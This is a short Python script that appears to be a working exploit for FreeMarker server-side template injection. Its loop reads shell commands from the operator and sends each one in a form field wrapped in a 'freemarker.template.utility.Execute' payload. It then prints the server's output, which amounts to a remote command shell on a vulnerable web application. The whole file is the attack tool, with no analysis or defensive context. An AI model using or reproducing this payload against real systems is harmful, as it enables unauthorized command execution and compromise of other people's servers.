import requests,os,sys

def sendcommand(url,method,param):
	while True:
		shell = input("> ")
		r = requests.request(method,url,data={param:'<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("'+shell+'")}'})
		print(r.text)

def main():
	try:
		sendcommand(sys.argv[1],sys.argv[2],sys.argv[3])
	except IndexError:
		print("url: url of the webapp to exploit")
		print("method: Specify request method")
		print("key value: Form data")

main()
